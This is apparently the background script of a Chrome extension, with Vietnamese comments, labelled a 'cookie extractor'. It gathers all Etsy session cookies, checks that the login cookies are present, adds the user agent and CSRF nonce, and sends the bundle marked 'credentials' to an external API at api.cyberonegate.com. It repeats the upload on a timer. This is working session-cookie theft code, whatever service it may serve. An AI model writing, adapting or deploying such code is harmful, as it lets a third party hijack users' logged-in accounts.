let intervalId = null;
const urlApi = 'https://api.cyberonegate.com';

// Hàm lấy cookie và gửi message
function getCookiesAndSendMessage(storeId, token, csrfNonce) {
    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
        if (tabs.length === 0) return;

        let tab = tabs[0];
        let url = new URL(tab.url);
        let domain = url.hostname;

        const cookiesArr = []
        let valid = false;

        setTimeout(
            () => {
                chrome.cookies.getAll({domain: "www.etsy.com"}, (cookies) => {
                    cookiesArr.push(...cookies);
                });

                chrome.cookies.getAll({domain: ".etsy.com"}, (cookies) => {
                    cookiesArr.push(...cookies);
                });

                setTimeout(
                    () => {
                        const cookieNames = [];
                        cookiesArr.forEach(cookie => {
                            cookieNames.push(cookie.name);
                        })
                        if (
                            cookieNames.includes("session-key-www") &&
                            cookieNames.includes("et-v1-1-1-_etsy_com") &&
                            cookieNames.includes("session-key-apex")
                        ) {
                            valid = true;
                        }

                        if (!valid) {
                            console.log("Lỗi 401: Cookies không có: session-key-www, et-v1-1-1-_etsy_com, session-key-apex");
                            return;
                        }

                        chrome.tabs.sendMessage(tab.id, {action: "getUserAgent"}, (response) => {
                            let userAgent = response?.userAgent || "Không lấy được userAgent";

                            const resultData = {
                                keyword: "credentials",
                                value: JSON.stringify({
                                    cookies: JSON.stringify(cookiesArr),
                                    userAgent: userAgent,
                                    csrfNonce: csrfNonce
                                })
                            };

                            // Gửi request đến API
                            fetch(`${urlApi}/Store/UpdateMetadata/${storeId}`, {
                                method: "PUT",
                                body: JSON.stringify(resultData),
                                headers: {
                                    "Content-Type": "application/json",
                                    Authorization: token,
                                },
                            })
                                .then((response) => {

                                    if (response.status === 401) {
                                        console.log("Lỗi 401", error);
                                    }
                                })
                                .catch((error) => {
                                    console.log("Lỗi", error);
                                    if (error.response?.status === 401) {
                                        console.log("Lỗi 401", error);
                                    }
                                });
                        });
                    }, 2000
                )
            }, 3000
        )
    });
}


// Lắng nghe message từ content.js
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
        if (tabs.length === 0) return;
        let tabId = tabs[0].id;

        if (message.action === "startCookieExtractor") {
            let token = message.token;
            let storeId = message.storeId;
            let timer = parseFloat(message.timer);
            if (isNaN(timer) || timer <= 0) {
                timer = 300;
            }
            let timerMinutes = timer * 60 * 1000;

            // Run RightNow
            getCookiesAndSendMessage(storeId, token, message.csrfNonce);

            // Chạy theo timer
            if (!intervalId) {
                intervalId = setInterval(() => getCookiesAndSendMessage(storeId, token, message.csrfNonce), timerMinutes);
            }
        }
    });
});
